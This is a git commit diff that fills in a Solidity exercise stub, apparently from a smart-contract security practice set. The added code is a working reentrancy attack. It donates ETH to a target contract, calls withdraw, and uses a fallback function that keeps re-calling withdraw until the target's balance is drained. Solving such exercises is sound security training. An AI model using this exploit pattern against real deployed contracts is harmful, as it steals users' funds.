913439ddbbc76a145bb652adea757478bb93f767
Bradley Woolf <bradleymwoolf@gmail.com>
2022-04-11 07:31:33 -0700

    6

--- contracts/6. Reentrance/AttackingReentrance.sol
+++ contracts/6. Reentrance/AttackingReentrance.sol
@@ -9,7 +9,19 @@ contract AttackingReentrance {
         contractAddress = _contractAddress;
     }
 
+    // send a little eth to open to comm
+    // call withdraw on the failed tx with fallback
     function hackContract() external {
         // Code me!
+        address hackAddress = address(this);
+        Reentrance(payable(contractAddress)).donate{value: hackAddress.balance}(hackAddress);
+        Reentrance(contractAddress).withdraw();
+    }
+
+    // call withdraw on the failed tx with fallback
+    fallback() external payable {
+        if (contractAddress.balance > 0 ) {
+            Reentrance(contractAddress).withdraw();
+        }
     }
 }
